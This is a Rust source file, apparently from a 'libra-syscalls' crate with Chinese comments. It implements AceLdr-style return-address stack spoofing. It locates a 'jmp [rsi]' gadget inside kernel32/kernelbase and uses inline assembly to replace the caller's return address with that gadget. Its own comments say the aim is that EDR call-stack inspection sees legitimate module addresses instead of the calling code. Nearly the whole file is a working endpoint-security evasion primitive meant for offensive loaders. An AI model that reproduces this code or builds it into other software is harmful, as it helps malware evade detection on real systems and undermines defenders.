//! 返回地址伪造（stack spoofing）：AceLdr 思路的独立实现。
//!
//! 核心手法：调用任意 Win32 函数前，把栈顶返回地址替换成目标模块内的一个
//! `jmp [rsi]` gadget。EDR 回溯调用栈时看到的返回地址落在 kernel32/kernelbase
//! 的合法指令上，而不是我们自己的模块。真正的返回地址被暂存到 `SpoofFrame`，
//! 目标函数返回后经 gadget → fixup 恢复栈并跳回原返回地址。
//!
//! 与参考实现的差异：gadget 用 `FF 26`（`jmp [rsi]`）而非 `FF 23`（`jmp [rbx]`），
//! 保存寄存器用 rsi 而非 rbx，结构布局与符号命名均独立。

use core::sync::atomic::{AtomicU64, Ordering};

use crate::ffi::{wide, GetModuleHandleW};
use crate::pe::PeImage;

/// `jmp qword ptr [rsi]`
const GADGET_PATTERN: [u8; 2] = [0xFF, 0x26];

/// 全局 gadget 槽，`init_spoof` 填充一次，之后只读。
#[used]
#[no_mangle]
pub static LIBRA_SPOOF_GADGET: AtomicU64 = AtomicU64::new(0);

/// 传给汇编桥的帧。汇编会就地改写 `function` 与 `saved_rsi`。
#[repr(C)]
pub struct SpoofFrame {
    /// 栈顶伪造的返回地址（`jmp [rsi]` gadget）。
    pub trampoline: usize,
    /// 目标函数地址；返回阶段被改写为原返回地址。
    pub function: usize,
    /// 暂存的 rsi。
    pub saved_rsi: usize,
}

extern "C" {
    fn libra_spoof(
        a: usize, b: usize, c: usize, d: usize,
        frame: usize, pad: usize,
        e: usize, f: usize, g: usize, h: usize,
    ) -> usize;
}

core::arch::global_asm!(r#"
    .p2align 4
    .globl libra_spoof
libra_spoof:
    pop r11
    add rsp, 8
    mov rax, qword ptr [rsp + 24]
    mov r10, qword ptr [rax]
    mov qword ptr [rsp], r10
    mov r10, qword ptr [rax + 8]
    mov qword ptr [rax + 8], r11
    mov qword ptr [rax + 16], rsi
    lea rsi, [rip + libra_spoof_fixup]
    mov qword ptr [rax], rsi
    mov rsi, rax
    jmp r10
libra_spoof_fixup:
    sub rsp, 16
    mov rcx, rsi
    mov rsi, qword ptr [rcx + 16]
    jmp qword ptr [rcx + 8]
"#);

/// 在 kernel32 / kernelbase 的可执行段里找 `jmp [rsi]` gadget。
pub fn init_spoof() -> Result<(), &'static str> {
    let gadget = find_gadget().ok_or("no jmp [rsi] gadget in kernel32/kernelbase")?;
    LIBRA_SPOOF_GADGET.store(gadget as u64, Ordering::Relaxed);
    Ok(())
}

fn find_gadget() -> Option<usize> {
    for name in ["kernel32.dll", "kernelbase.dll"] {
        let base = unsafe { GetModuleHandleW(wide(name).as_ptr()) as usize };
        if base == 0 {
            continue;
        }
        if let Some(img) = unsafe { PeImage::parse(base) } {
            if let Some(g) = unsafe { img.scan_executable(&GADGET_PATTERN) } {
                return Some(g);
            }
        }
    }
    None
}

/// 伪造返回地址地调用一个 Win32 函数。
///
/// `target` 为目标函数地址（如 `GetProcAddress` 的结果）。前 8 个 `usize`
/// 参数按 Win64 约定传递（寄存器 + 栈），多余参数填 0 即可。返回值即目标
/// 函数的 `rax`。
///
/// # Safety
/// `target` 必须是合法的函数地址，参数必须与目标函数签名匹配。
/// 调用前必须先 `init()`（或 `init_spoof()`），否则 panic。
#[inline(always)]
pub unsafe fn spoof_call(
    target: usize,
    a1: usize, a2: usize, a3: usize, a4: usize,
    a5: usize, a6: usize, a7: usize, a8: usize,
) -> usize {
    let gadget = LIBRA_SPOOF_GADGET.load(Ordering::Relaxed) as usize;
    assert!(
        gadget != 0,
        "libra-syscalls: spoof gadget not initialized (call init first)"
    );

    let mut frame = SpoofFrame {
        trampoline: gadget,
        function: target,
        saved_rsi: 0,
    };
    libra_spoof(
        a1, a2, a3, a4,
        &mut frame as *mut SpoofFrame as usize,
        0,
        a5, a6, a7, a8,
    )
}
